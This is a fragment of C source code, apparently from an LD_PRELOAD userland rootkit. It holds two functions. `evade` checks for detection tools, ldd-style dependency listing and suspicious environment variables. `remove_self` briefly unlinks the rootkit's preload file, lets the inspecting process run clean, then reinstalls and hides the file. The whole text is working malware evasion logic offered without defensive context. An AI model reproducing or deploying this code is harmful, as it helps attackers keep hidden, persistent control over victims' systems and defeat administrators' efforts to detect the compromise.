int remove_self(void){
    if(not_user(0))
        return VINVALID_PERM;

    hook(CUNLINK);
    call(CUNLINK, PRELOAD_FILE);
#ifdef ROOTKIT_BASHRC
    call(CUNLINK, BASHRC_PATH);
    call(CUNLINK, BASHRC_PATH);
#endif

    pid_t pid;
    if((pid = fork()) == -1) return VFORK_ERR;   /* if we can't fork, return error */
    else if(pid == 0) return VFORK_SUC;          /* return VFORK_SUC in the child */

    /* continue in the parent process */
    wait(NULL);
    reinstall();               /* rewrite our preload file */
    hide_path(PRELOAD_FILE);   /* and hide it */
    return VEVADE_DONE;
}

int evade(const char *filename, char *const argv[], char *const envp[]){
    char *scary_proc, *scary_path;

    /* check scary_procs array */
    for(int i = 0; i < SCARY_PROCS_SIZE; i++){
        scary_proc = scary_procs[i];

        char path[strlen(scary_proc) + 3];
        snprintf(path, sizeof(path), "*/%s", scary_proc);

        /* determine if calling process is a scary process, or someone
         * is trying to launch a scary process. */
        if(process(scary_proc)) return remove_self();
        else if(strstr(scary_proc, filename)) return remove_self();
        else if(!fnmatch(path, filename, FNM_PATHNAME)) return remove_self();
    }

    /* check scary_paths array.
       see if somebody is trying to call the dynamic linker
       in order to resolve a path's dependencies. */
    for(int i = 0; i < SCARY_PATHS_SIZE; i++){
        scary_path = scary_paths[i];

        if(!fnmatch(scary_path, filename, FNM_PATHNAME) || strstr(scary_path, filename))
            for(int ii = 0; argv[ii] != NULL; ii++)
                if(!strncmp("--list", argv[ii], 6))
                    return remove_self();
    }

    /* check scary_variables array to see if there is anything
       set that is a potential threat and subvert it. */
    if(envp != NULL)
        for(int i = 0; envp[i] != NULL; i++)
            for(int ii = 0; ii < SCARY_VARIABLES_SIZE; ii++)
                if(!strncmp(scary_variables[ii], envp[i], strlen(scary_variables[ii])))
                    return remove_self();

    /* if the above checks bore no results, there is (apparently)
     * nothing to do. */
    return VNOTHING_DONE;
}